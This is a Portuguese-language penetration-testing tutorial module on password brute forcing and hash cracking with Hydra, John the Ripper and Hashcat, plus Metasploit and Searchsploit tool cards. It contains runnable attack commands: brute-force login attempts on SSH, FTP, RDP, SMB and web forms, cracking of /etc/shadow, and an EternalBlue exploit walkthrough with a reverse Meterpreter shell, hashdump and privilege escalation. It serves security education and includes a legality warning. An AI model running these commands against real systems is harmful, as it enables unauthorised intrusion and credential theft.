# 🔑 Brute Force e Cracking

> Ferramentas para quebrar senhas, hashes e fazer força bruta em serviços.

## 📚 O que é Exploração (Exploitation)?

**Exploração** é o ato de **usar uma vulnerabilidade** para ganhar acesso não autorizado. É como encontrar uma tranca fraca e usar um grampo para abrir — você está explorando uma falha para entrar.

### Por que isso é importante?

- É o passo que **transforma vulnerabilidade em acesso real**
- Sem exploração, você só tem teoria (não prova de conceito)
- Permite testar **impacto real** da falha
- Em pentest, é o que o cliente quer ver funcionando

### Como funciona na prática?

```
Vulnerabilidade identificada (Módulo 3)
        ↓
Explorar a vulnerabilidade (este módulo)
        ↓
Ganhar acesso (shell, credenciais, dados)
```

### Tipos de exploração

| Tipo | Como funciona | Ferramentas |
|:---|:---|:---|
| Brute Force | Testar senhas automaticamente | Hydra, Medusa |
| Cracking | Quebrar hashes de senhas | John, Hashcat |
| Exploit | Usar vulnerabilidade de código | Metasploit, pwntools |
| Social Engineering | Enganar o humano | SET, GoPhish |

### Brute Force vs Cracking

| Brute Force | Cracking |
|:---|:---|
| Testa senhas em serviços | Quebrar hashes já coletados |
| SSH, FTP, HTTP login | MD5, SHA256, NTLM |
| Precisa de serviço ativo | Só precisa do hash |
| Hydra, Medusa | John, Hashcat |

### ⚠️ Ética e Legalidade

> Exploração **sem autorização** é **crime** (Lei 12.737/2012). Use apenas em:
> - CTFs (Capture The Flag)
> - Labs de estudo (TryHackMe, HackTheBox)
> - Pentest com contrato **por escrito**

---

## 🚀 Passo a Passo — Como fazer Brute Force e Cracking

Você já encontrou serviços abertos (SSH, FTP, HTTP). Agora vamos tentar **acessar** esses serviços.

### Passo 1: Preparar wordlists
```bash
# Primeiro, veja onde estão as wordlists
ls /usr/share/seclists/Passwords/Top1000.txt       # senhas mais comuns
ls /usr/share/seclists/Usernames/top-usernames-shortlist.txt  # usuários comuns
```

### Passo 2: Tentar brute force no SSH (Hydra)
```bash
# Se o Nmap mostrou porta 22 (SSH) aberta, tente quebrar a senha
hydra -l admin -P /usr/share/seclists/Passwords/Top1000.txt ssh://192.168.1.1
# -l admin = testar com usuário "admin"
# -P = arquivo de senhas
```
**Se encontrou:** o Hydra mostra `[22][ssh] host: 192.168.1.1   login: admin   password: senha123`

### Passo 3: Se tem um hash para quebrar (John)
```bash
# Se você coletou hashes (ex: de /etc/shadow), primeiro identifique o formato
hashid '5d41402abc4b2a76b9719d911017c592'

# Depois, tente quebrar com John
john --wordlist=/usr/share/seclists/Passwords/Top1000.txt hash.txt

# Para ver o que já foi crackeado
john --show hash.txt
```

### Passo 4: Se tem GPU, usar Hashcat (mais rápido)
```bash
# Hashcat é muito mais rápido que John para hashes simples
# Exemplo para MD5:
hashcat -m 0 hash.txt /usr/share/seclists/Passwords/Top1000.txt

# Para ver resultados
hashcat -m 0 --show hash.txt
```

### Resumo da ordem — Por que essa sequência?

Exploração segue a ordem: **preparar → identificar → quebrar → usar**.

```
PASSO 1: Preparar wordlists → Ter listas de senhas prontas
├── POR QUE: Brute force só funciona com boas wordlists
├── O QUE FAZER: Instalar SecLists (maior coleção de wordlists)
├── COMANDO: sudo apt install seclists
├── ONDE FICA: /usr/share/seclists/
├── QUANDO AVANÇAR: Quando tiver wordlists instaladas
└── DICAS: Comece com Top10000.txt, depois vá para listas maiores

        ↓

PASSO 2: hydra → Brute force em serviços (SSH, FTP, HTTP)
├── POR QUE: Hydra testa senhas automaticamente em serviços
├── O QUE PROCURAR: Senha encontrada, resposta "valid password"
├── COMANDO: hydra -l admin -P passwords.txt ssh://target.com
├── QUANDO AVANÇAR: Se encontrar senha, use ela para logar
└── SE DER ERRADO: Se muito lento, reduza threads: -t 4

        ↓

PASSO 3: hashid → Identificar tipo de hash
├── POR QUE: Cada tipo de hash tem forma diferente de crackear
├── O QUE PROCURAR: Nome do hash (MD5, SHA256, NTLM, bcrypt)
├── COMANDO: hashid '5f4dcc3b5aa765d61d8327deb882cf99'
├── QUANDO AVANÇAR: Quando souber o tipo de hash
└── SE DER ERRADO: Se não identificar, tente: hash-identifier

        ↓

PASSO 4: john → Crackear hashes (aceita vários formatos)
├── POR QUE: John é o mais compatível com diferentes formatos
├── O QUE PROCURAR: Hash crackeado (aparece ao lado do hash)
├── COMANDO: john --wordlist=/usr/share/seclists/Passwords/Top10000.txt hash.txt
├── QUANDO AVANÇAR: Se john não crackear, tente hashcat
└── SE DER ERRADO: Se não reconhecer o formato, use: --format=raw-md5

        ↓

PASSO 5: hashcat → Crackear com GPU (mais rápido)
├── POR QUE: GPU é 100x mais rápida que CPU para hashes
├── O QUE PROCURAR: Hash crackeado no output
├── COMANDO: hashcat -m 0 hash.txt wordlist.txt (-m 0 = MD5)
├── QUANDO PARAR: Quando crackear ou esgotar wordlist
└── SE DER ERRADO: Se não tiver GPU, use john (CPU)

IMPORTANTE: Só crackee hashes que você tem autorização!

---

**Dica:** Para HTTP POST form (login de site): hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

---

## Hydra

Força bruta de login em praticamente qualquer serviço (SSH, FTP, HTTP, SMB, RDP, etc).

### 🎯 Quando usar o Hydra
- Quando encontrou um serviço aberto (SSH, FTP, RDP) mas não tem a senha
- Quando quer testar credenciais padrão em múltiplos hosts
- Quando precisa testar login forms HTTP/HTTPS com brute force
- Quando um ataque anterior de enumeração revelou nomes de usuários válidos

### 🛠️ Como o Hydra te ajuda
- Testa milhares de combinações de usuário/senha automaticamente em minutos
- Suporta 50+ protocolos (SSH, FTP, HTTP, SMB, RDP, MySQL, etc)
- Permite ajustar threads para ser mais rápido ou mais silencioso
- Para no primeiro sucesso quando encontra credenciais válidas

### ➡️ Depois de usar o Hydra — Próximos passos
1. Use as credenciais encontradas para logar no serviço (SSH, FTP, etc)
2. Enumere o sistema acessado para encontrar vetores de privesc
3. Verifique se as mesmas credenciais funcionam em outros serviços
4. Documente o vetor de ataque para o relatório de pentest

### Instalação
```bash
sudo apt install -y hydra
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-l` | Usuário único |
| `-L` | Lista de usuários |
| `-p` | Senha única |
| `-P` | Lista de senhas |
| `-t` | Threads (padrão 16) |
| `-f` | Parar no primeiro sucesso |
| `-F` | Parar quando achar em qualquer host |
| `-v` | Verbose (mostrar tentativas) |
| `-V` | Verbose com login/senha em cada linha |
| `-d` | Debug |
| `-s` | Porta (quando não é padrão) |
| `-o` | Output |
| `-M` | Lista de hosts |

### Exemplos práticos

```bash
# SSH brute force (usuário único)
hydra -l admin -P /usr/share/seclists/Passwords/Top1000.txt ssh://192.168.1.1

# SSH brute force (lista de usuários)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P passwords.txt ssh://192.168.1.1

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP POST form (login form)
# Primeiro, inspecione o form no navegador para descobrir os campos
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"
# /login = caminho do form
# user=^USER^&pass=^PASS^ = campos (substituídos pelo hydra)
# F=incorrect = string que indica falha

# HTTP GET form
hydra -l admin -P passwords.txt 192.168.1.1 http-get-form \
  "/admin/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# SMB brute force
hydra -l administrator -P passwords.txt smb://192.168.1.1

# RDP brute force
hydra -l admin -P passwords.txt rdp://192.168.1.1

# MySQL brute force
hydra -l root -P passwords.txt mysql://192.168.1.1

# Com porta específica
hydra -l admin -P passwords.txt -s 8080 ssh://192.168.1.1

# Múltiplos hosts
hydra -l admin -P passwords.txt -M targets.txt ssh

# Parar no primeiro hit
hydra -l admin -P passwords.txt -f ssh://192.168.1.1

# Com verbose para acompanhar
hydra -l admin -P passwords.txt -V ssh://192.168.1.1

# Menos threads (mais lento, menos detecção)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.1

# Output para arquivo
hydra -l admin -P passwords.txt -o hydra_results.txt ssh://192.168.1.1
```

### Dicas
```bash
# Descobrir o nome do form para HTTP POST
# Abra o form no navegador, inspecione o elemento, veja os nomes dos campos

# Se o form redireciona em sucesso/falha, usar F= para falha ou S= para sucesso
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"
# S= = string que indica SUCESSO
```

---

## John the Ripper (john)

Cracking de hashes. Suporta centenas de formatos de hash.

### 🎯 Quando usar o John the Ripper
- Quando coletou hashes de um sistema (ex: /etc/shadow, banco de dados) e precisa quebrá-los
- Quando não tem GPU e precisa crackear hashes via CPU
- Quando encontrou um formato de hash exótico que outros tools não reconhecem
- Quando quer aplicar regras de mutação para aprimorar uma wordlist

### 🛠️ Como o John the Ripper te ajuda
- Suporta centenas de formatos de hash (MD5, SHA, bcrypt, NTLM, descrypt, etc)
- Detecta automaticamente o formato do hash sem precisar especificar
- Oferece múltiplos modos: wordlist, incremental, single e rules
- Salva progresso automaticamente — pode interromper e continuar depois

### ➡️ Depois de usar o John the Ripper — Próximos passos
1. Verifique os hashes crackeados com `john --show hash.txt`
2. Use as senhas obtidas para autenticar em serviços encontrados
3. Se o John não crackear, tente Hashcat (se tiver GPU disponível)
4. Teste as senhas em outros sistemas do mesmo domínio

### Instalação
```bash
sudo apt install -y john
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `--wordlist=` | Wordlist para brute force |
| `--rules` | Aplicar regras de mutação |
| `--format=` | Forçar formato do hash |
| `--list=formats` | Listar formatos suportados |
| `--incremental` | Modo incremental (brute force puro) |
| `--show` | Mostrar hashes já crackeados |
| `--single` | Modo single (usa info do /etc/passwd) |

### Exemplos práticos

```bash
# Crack automático (john tenta adivinhar o formato)
john hash.txt

# Com wordlist
john --wordlist=/usr/share/seclists/Passwords/Top1000.txt hash.txt

# Com regras (mutações da wordlist)
john --wordlist=wordlist.txt --rules hash.txt

# Forçar formato
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt
john --format=bcrypt hash.txt

# Listar formatos suportados
john --list=formats

# Modo incremental (brute force puro, lento)
john --incremental hash.txt

# Modo single
john --single hash.txt

# Mostrar resultados
john --show hash.txt

# Cracking de /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Crackear vários hashes de uma vez
```bash
# Colocar vários hashes no arquivo (um por linha)
cat > hashes.txt << EOF
5d41402abc4b2a76b9719d911017c592
e99a18c428cb38d5f260853678922e03
098f6bcd4621d373cade4e832627b4f6
EOF

john --wordlist=/usr/share/seclists/Passwords/Top1000.txt hashes.txt
```

### Formatos mais comuns

| Formato | Exemplo |
|:---|:---|
| raw-md5 | `5d41402abc4b2a76b9719d911017c592` |
| raw-sha1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| raw-sha256 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` |
| bcrypt | `$2a$10$...` |
| NTLM | `aad3b435b51404eeaad3b435b51404ee` |
| descrypt | `rEK1ecacw.7.c` |

---

## Hashcat

Cracking de hashes com GPU. Muito mais rápido que John para hashes simples.

### 🎯 Quando usar o Hashcat
- Quando tem uma GPU disponível e precisa crackear grandes volumes de hashes
- Quando o John the Ripper foi lento demais ou não conseguiu crackear
- Quando precisa aplicar máscaras (brute force puro) com alta performance
- Quando o alvo tem hashes NTLM, MD5 ou SHA em escala (ex:.Active Directory)

### 🛠️ Como o Hashcat te ajuda
- Processa hashes 100x mais rápido que ferramentas baseadas em CPU
- Suporta 300+ modos de hash (MD5, SHA, NTLM, WPA, Kerberos, etc)
- Permite máscaras inteligentes (?l para letra, ?d para dígito, ?u para maiúscula)
- Aceita regras de mutação que expandem uma wordlist pequena em milhões de variações

### ➡️ Depois de usar o Hashcat — Próximos passos
1. Consulte os resultados com `hashcat --show cracked.txt`
2. Use as senhas para logar nos serviços descobertos no reconhecimento
3. Se o ataque falhar, combine wordlist + regras (-r best64.rule) ou máscaras
4. Registre o tempo gasto e a taxa de hashes/segundo para métricas do pentest

### Instalação
```bash
sudo apt install -y hashcat
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-m` | Modo/tipo do hash |
| `-a` | Modo de ataque |
| `-o` | Output |
| `--show` | Mostrar hashes crackeados |
| `-r` | Regra de mutação |
| `-j` / `-k` | Regra para input/output |

### Modos de hash mais usados

| Modo (-m) | Tipo |
|:---|:---|
| `0` | MD5 |
| `100` | SHA1 |
| `1400` | SHA-256 |
| `1000` | NTLM |
| `3200` | bcrypt |
| `1800` | sha512crypt |
| `7400` | sha256crypt |
| `5500` | NetNTLMv2 |
| `13100` | Kerberos TGS-REP |
| `16800` | WPA-PMKID-PBKDF2 |

### Modos de ataque

| Modo (-a) | Descrição |
|:---|:---|
| `0` | Straight (wordlist puro) |
| `3` | Brute force (máscara) |
| `6` | Wordlist + máscara |
| `7` | Máscara + wordlist |

### Exemplos práticos

```bash
# MD5 — wordlist simples
hashcat -m 0 hash.txt /usr/share/seclists/Passwords/Top1000.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt wordlist.txt

# bcrypt (lento, mais Secure)
hashcat -m 3200 hash.txt wordlist.txt

# Brute force com máscara
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l    # 6 minúsculas
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d    # 6 dígitos
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d    # 1 maiúscula + 4 minúsculas + 2 dígitos

# Wordlist + regra
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Múltiplas wordlists
hashcat -m 0 hash.txt wordlist1.txt wordlist2.txt

# Output
hashcat -m 0 hash.txt wordlist.txt -o cracked.txt

# Mostrar resultados
hashcat -m 0 --show cracked.txt

# Listar modos de hash
hashcat --list | head -30

# Benchmark (testar performance)
hashcat -b
```

### Regras de hashcat
```bash
# Regra padrão: aplica mutações (maiúscula, números, símbolos)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Regra agressiva
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Criar regra customizada no arquivo .rule
# : = Characters
# l = lowercase all
# u = uppercase first
# c = capitalize
# t = toggle case
# $X = append character X
# ^X = prepend character X
```

---

## Fluxo típico de Cracking

```
1. Coletar hashes (shadow, banco de dados, captura de rede)
        ↓
2. Identificar formato (john --list=formats ou hashid)
        ↓
3. Tentar John primeiro (mais formatos suportados)
        ↓
4. Se não crackear → Hashcat (GPU, mais rápido)
        ↓
5. Se wordlist falhar → regras → brute force
        ↓
6. Se ainda não → verificar se hash é fraco ou precisa de outro approach
```

### Combinando John + Hashcat
```bash
# Converter formato do John para Hashcat
john --format=raw-md5 --list=formats
# Se o formato for "Raw-MD5", Hashcat usa -m 0

# Converter de John para Hashcat (john2hashcat)
# Não existe conversor oficial, mas o formato raw geralmente é compatível
```

### Ferramenta auxiliar: hashid
```bash
# Identificar tipo de hash
sudo apt install -y hashid
hashid '5d41402abc4b2a76b9719d911017c592'
hashid -f 'hash_to_crack.txt'
```

---

## Lab Prático

### Exercício 1: Brute Force com Hydra
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/hydra
- **O que vai praticar:** Força bruta em SSH, FTP e HTTP forms com Hydra, uso de wordlists e ajuste de threads
- **Tempo estimado:** 45 minutos

### Exercício 2: Cracking de Hashes com John
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/johntheripper0
- **O que vai praticar:** Identificação de formatos, cracking com wordlists, regras de mutação e brute force puro
- **Tempo estimado:** 40 minutos

### Exercício 3: Hashcat na Prática
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/hashcat
- **O que vai praticar:** Cracking com GPU, máscaras, regras e diferentes formatos de hash (MD5, NTLM, bcrypt)
- **Tempo estimado:** 50 minutos

### Exercício 4: Brute Force - Credentials
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/starting-point
- **O que vai praticar:** Enumeração de credenciais, brute force em serviços web e exploração de login forms
- **Tempo estimado:** 90 minutos

### Dica de Estudo
> Comece sempre com wordlists pequenas (Top1000) antes de usar listas grandes. Identifique o formato do hash antes de crackear. Documente cada tentativa e os resultados encontrados. Use Hydra com `-t 4` para evitar bloqueios.

---

## Tool Card: Metasploit Framework

**O que é:** Framework de exploração mais usado do mundo — 2,300+ exploits, payloads, auxiliares e post-exploração. Essencial para OSCP/CEH.

### 🎯 Quando usar o Metasploit Framework
- Quando encontrou uma vulnerabilidade (via Nmap, Nuclei ou Searchsploit) e precisa explorá-la
- Quando quer gerar payloads customizados (reverse shell, bind shell, meterpreter)
- Quando precisa de uma sessão interativa no alvo para post-exploração
- Quando quer automatizar scans de vulnerabilidade com módulos auxiliares

### 🛠️ Como o Metasploit te ajuda
- Reúne 2,300+ exploits, payloads e auxiliares em um único console interativo
- Fornece sessões Meterpreter para pós-exploração (hashdump, keylogger, screenshot)
- Permite escalar privilégios com exploits locais (MS16-032, MS17-010, etc)
- Integra com Nmap, Searchsploit e outras ferramentas via(resource scripts)

### ➡️ Depois de usar o Metasploit Framework — Próximos passos
1. Interaja com a sessão Meterpreter para coletar informações (`sysinfo`, `getuid`)
2. Execute `hashdump` para extrair hashes e quebrar com John/Hashcat
3. Tente escalar privilégios com exploits locais (background → use local exploit)
4. Documente cada passo: vulnerabilidade → exploitation → privesc → impacto

### Instalação

```bash
# Pré-instalado no Kali. Verificar:
msfconsole --version
# Framework version: 6.3.44-dev
```

### Fluxo básico do Metasploit

```
1. msfconsole         → Abrir console
2. search             → Buscar exploit
3. use exploit/...    → Selecionar exploit
4. show options       → Ver parâmetros necessários
5. set RHOSTS 10.0.0.1 → Definir alvo
6. set PAYLOAD ...    → Definir payload
7. exploit            → Executar
```

### Comandos essenciais

| Comando | O que faz |
|:--------|:----------|
| `msfconsole` | Abrir console interativo |
| `search <termo>` | Buscar exploits/auxiliares |
| `use <exploit>` | Selecionar módulo |
| `show options` | Ver parâmetros do módulo |
| `set <opção> <valor>` | Definir parâmetro |
| `show payloads` | Listar payloads disponíveis |
| `set PAYLOAD <payload>` | Definir payload |
| `exploit` | Executar ataque |
| `run` | Sinônimo de exploit |
| `back` | Sair do módulo atual |
| `sessions` | Listar sessões abertas |
| `sessions -i 1` | Interagir com sessão 1 |
| `sessions -k 1` | Matar sessão 1 |
| `info` | Ver detalhes do módulo |
| `show advanced` | Ver opções avançadas |

### Exemplo completo: scan → exploit → session

```bash
# 1. Iniciar msfconsole
msfconsole

# OUTPUT ESPERADO:
#        =[ metasploit v6.3.44-dev ]
# + -- --=[ 2390 exploits - 1230 auxiliary ]
# + -- --=[ 413 payloads - 46 encoders - 11 nops ]
# + -- --=[ 9 evasion plugins ]
#
# msf6 >

# 2. Buscar exploit para MS17-010 (EternalBlue)
msf6 > search ms17-010

# OUTPUT ESPERADO:
# Matching Modules
# ================
#   #  Name                   Disclosure Date  Rank     Check  Description
#   -  ----                   ---------------  ----     -----  -----------
#   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

# 3. Selecionar exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# OUTPUT ESPERADO:
# [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# 4. Ver parâmetros
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# OUTPUT ESPERADO:
# Module options:
#    RHOSTS    The target host(s)
#    RPORT     The target port (SMB)    yes  445
#    SMBDomain  Workgroup               no
#    SMBUser    SMB Username             no
#    SMBPass    SMB Password             no
#
# Payload options:
#    EXITFUNC  Thread exit function     yes  thread
#    LHOST     The listen address       yes  10.0.0.100
#    LPORT     The listen port          yes  4444

# 5. Definir parâmetros
msf6 > set RHOSTS 10.0.0.1
RHOSTS => 10.0.0.1
msf6 > set LHOST 10.0.0.100
LHOST => 10.0.0.100

# 6. Executar
msf6 > exploit

# OUTPUT ESPERADO:
# [*] Started reverse TCP handler on 10.0.0.100:4444
# [*] 10.0.0.1:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
# [*] 10.0.0.1:445 - Using named pipe: f4cc0b8c001beef1
# [*] 10.0.0.1:445 - Target CUL: 0x9001f - Likely exploitable!
# [*] 10.0.0.1:445 - Metasploit relaying to named pipe...
# [*] Sending stage (200774 bytes) to 10.0.0.1
# [*] Meterpreter session 1 opened (10.0.0.100:4444 -> 10.0.0.1:49152)

# 7. Interagir com a sessão
meterpreter > sysinfo
# Computer        : DESKTOP-ABC123
# OS              : Windows 7 (6.1.7601 Service Pack 1)
# Architecture    : x64
# System Language : pt-BR
# Meterpreter     : x64/windows

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Escalar privilégios com Metasploit

```bash
# Dentro da sessão Meterpreter:
meterpreter > getuid
# Server username: DOMINIO\usuario

# Usar exploit de privesc (ex: ms16-032)
meterpreter > background  # voltar ao console
msf6 > use exploit/windows/local/ms16_032_secondary_logon
msf6 > set SESSION 1
msf6 > set LHOST 10.0.0.100
msf6 > exploit

# Nova sessão com SYSTEM:
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

### Módulos auxiliares úteis

```bash
# Scan de vulns
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.0.0.0/24
msf6 > run

# OUTPUT ESPERADO:
# [+] 10.0.0.1:445      - Host is likely VULNERABLE to MS17-010!
# [-] 10.0.0.2:445      - Host does not appear vulnerable

# Enumeração de usuários SMB
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 > set RHOSTS 10.0.0.1
msf6 > run

# Brute force SSH
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 10.0.0.1
msf6 > set USERNAME admin
msf6 > set PASS_FILE /usr/share/seclists/Passwords/Top1000.txt
msf6 > run
```

---

## Tool Card: Searchsploit

**O que é:** Interface CLI para Exploit-DB — busca offline de exploits por nome, CVE, plataforma.

### 🎯 Quando usar o Searchsploit
- Quando identificou uma versão de software específica e quer saber se existe exploit público
- Quando tem um CVE e precisa encontrar código de exploração funcional
- Quando quer cruzar o output do Nmap com exploits conhecidos
- Quando precisa de uma referência rápida sem abrir o navegador

### 🛠️ Como o Searchsploit te ajuda
- Busca offline no banco de dados do Exploit-DB — funciona sem internet
- Permite visualizar o código do exploit antes de baixar (`-x ID`)
- Aceita input do Nmap em XML para sugerir exploits automaticamente
- Copia exploits para o diretório local com um único comando (`-m ID`)

### ➡️ Depois de usar o Searchsploit — Próximos passos
1. Copie o exploit com `searchsploit -m ID` e analise o código
2. Verifique se o exploit é para Metasploit (usa direto no msfconsole) ou standalone
3. Teste em ambiente controlado antes de usar no alvo real
4. Adapte o exploit se necessário (mude IP, porta ou payload)

### Instalação

```bash
# Pré-instalado no Kali (faz parte do exploitdb)
searchsploit --version
# Exploit-Database - https://www.exploit-db.com/
```

### Comandos essenciais

| Comando | O que faz |
|:--------|:----------|
| `searchsploit <termo>` | Buscar exploits |
| `searchsploit -c <termo>` | Busca case-insensitive |
| `searchsploit -x <ID>` | Ver código do exploit |
| `searchsploit -m <ID>` | Copiar exploit para diretório atual |
| `searchsploit --nmap <arquivo>` | Buscar exploits baseado em output do Nmap |
| `searchsploit --cve <CVE>` | Buscar por CVE |
| `searchsploit -p` | Ver path completo do exploit |

### Exemplos práticos

```bash
# Buscar exploit para Windows 7
searchsploit windows 7 smb

# OUTPUT ESPERADO:
# Exploits: 3
# ──────────────────────────────────────────────
#  Exploit Title                                                   | Path
# ──────────────────────────────────────────────
#  Microsoft Windows 7/8/10 SMB Remote Code Execution (MS17-010)  | windows/remote/42315.py
#  Microsoft Windows 7 - SMB Remote Code Execution (MS17-010)      | windows/remote/41891.rb
# ──────────────────────────────────────────────

# Buscar por CVE
searchsploit --cve 2017-0144

# Ver código do exploit
searchsploit -x 42315

# Copiar exploit para diretório atual
searchsploit -m 42315

# OUTPUT ESPERADO:
#   Exploit: Microsoft Windows 7/8/10 SMB Remote Code Execution (MS17-010)
#   Path: /usr/exploits/windows/remote/42315.py
#   Copied to: ./42315.py

# Buscar com output do Nmap (salvar nmap em XML)
nmap -sV -oX scan.xml 10.0.0.1
searchsploit --nmap scan.xml

# Buscar apenas exploits (excluir auxiliares)
searchsploit --exclude="auxiliary" windows smb
```

### Integrar Searchsploit + Metasploit

```bash
# Encontrar exploit no searchsploit
searchsploit ms17-010

# Copiar e ver o código
searchsploit -m 42315
cat 42315.py

# Se for um exploit do Metasploit, usar direto no msfconsole:
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

---

## Fluxo de Explotation completo

```
1. Reconhecimento (Nmap)
        ↓
2. Identificar vulnerabilidade (searchsploit / nuclei)
        ↓
3. Escolher exploit (Metasploit ou manual)
        ↓
4. Configurar payload e parâmetros
        ↓
5. Executar exploit
        ↓
6. Ganhar acesso (Meterpreter / shell)
        ↓
7. Escalar privilégios (privesc)
        ↓
8. Manter acesso (persistence)
```
